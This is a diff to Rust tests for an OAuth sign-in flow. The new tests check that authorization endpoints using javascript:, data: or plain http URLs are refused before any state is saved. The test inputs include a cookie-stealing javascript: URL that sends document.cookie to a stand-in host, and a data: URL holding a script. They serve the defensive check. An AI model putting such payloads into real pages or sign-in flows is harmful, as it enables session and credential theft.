@@ -1,4 +1,5 @@
 use super::*;
+use crate::domain::models::UnsafeAuthorizationUrl;
 use axum::{
     Json, Router,
     extract::State,
@@ -79,6 +80,8 @@ struct MockAuthorizationServer {
     base_url: String,
     supports_client_metadata: bool,
     registrations: Arc<AtomicUsize>,
+    /// The sign-in page the metadata advertises, when not `{base_url}/authorize`.
+    authorization_endpoint: Option<String>,
 }
 
 async fn protected_resource(
@@ -111,7 +114,10 @@ async fn authorization_server_metadata(
 ) -> Json<serde_json::Value> {
     Json(serde_json::json!({
         "issuer": state.base_url,
-        "authorization_endpoint": format!("{}/authorize", state.base_url),
+        "authorization_endpoint": state
+            .authorization_endpoint
+            .clone()
+            .unwrap_or_else(|| format!("{}/authorize", state.base_url)),
         "token_endpoint": format!("{}/token", state.base_url),
         "registration_endpoint": format!("{}/register", state.base_url),
         "response_types_supported": ["code"],
@@ -140,6 +146,13 @@ async fn register_client(
 async fn spawn_authorization_server(
     supports_client_metadata: bool,
 ) -> (String, Arc<AtomicUsize>, tokio::task::JoinHandle<()>) {
+    spawn_authorization_server_with_endpoint(supports_client_metadata, None).await
+}
+
+async fn spawn_authorization_server_with_endpoint(
+    supports_client_metadata: bool,
+    authorization_endpoint: Option<String>,
+) -> (String, Arc<AtomicUsize>, tokio::task::JoinHandle<()>) {
     let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
         .await
         .expect("bind mock authorization server");
@@ -152,6 +165,7 @@ async fn spawn_authorization_server(
         base_url: base_url.clone(),
         supports_client_metadata,
         registrations: registrations.clone(),
+        authorization_endpoint,
     };
     let app = Router::new()
         .route("/mcp", get(protected_resource))
@@ -175,9 +189,15 @@ async fn spawn_authorization_server(
 }
 
 fn oauth_service() -> OAuthService<FakeServerStore, FakeStateStore> {
+    oauth_service_with_state(FakeStateStore::default())
+}
+
+fn oauth_service_with_state(
+    state_store: FakeStateStore,
+) -> OAuthService<FakeServerStore, FakeStateStore> {
     OAuthService::new(
         FakeServerStore,
-        FakeStateStore::default(),
+        state_store,
         OAuthClientMetadata::new(CLIENT_METADATA_URL.to_string(), REDIRECT_URI.to_string()),
         McpHttp::new(crate::outbound::guarded_http::AddressPolicy::AnyAddress).unwrap(),
         PreRegisteredProviders::empty(),
@@ -235,5 +255,54 @@ async fn dcr_remains_the_fallback_when_cimd_is_not_supported() {
         Some("dcr-client-id")
     );
     assert_eq!(registrations.load(Ordering::SeqCst), 1);
+    server_task.abort();
+}
+
+#[tokio::test]
+async fn a_script_sign_in_page_is_refused_before_any_state_is_saved() {
+    for endpoint in [
+        "javascript:fetch('//x/'+document.cookie)//",
+        "data:text/html,<script>alert(1)</script>",
+        "http://auth.example.com/authorize",
+    ] {
+        let (base_url, _, server_task) =
+            spawn_authorization_server_with_endpoint(true, Some(endpoint.to_owned())).await;
+        let state_store = FakeStateStore::default();
+
+        let error = oauth_service_with_state(state_store.clone())
+            .start_authorization(&test_user_id(), &format!("{base_url}/mcp"), "Test server")
+            .await
+            .expect_err("an unsafe sign-in page is refused");
+
+        assert!(
+            error.downcast_ref::<UnsafeAuthorizationUrl>().is_some(),
+            "{endpoint}: {error:#}"
+        );
+        assert!(
+            state_store
+                .pending
+                .lock()
+                .expect("state mutex is not poisoned")
+                .is_empty(),
+            "{endpoint}: no pending state"
+        );
+        server_task.abort();
+    }
+}
+
+#[tokio::test]
+async fn an_https_sign_in_page_on_another_host_starts() {
+    let (base_url, _, server_task) = spawn_authorization_server_with_endpoint(
+        true,
+        Some("https://auth.example.com/authorize".to_owned()),
+    )
+    .await;
+
+    let authorization_url = oauth_service()
+        .start_authorization(&test_user_id(), &format!("{base_url}/mcp"), "Test server")
+        .await
+        .expect("an https sign-in page starts");
+
+    assert!(authorization_url.starts_with("https://auth.example.com/authorize?"));
     server_task.abort();
 }
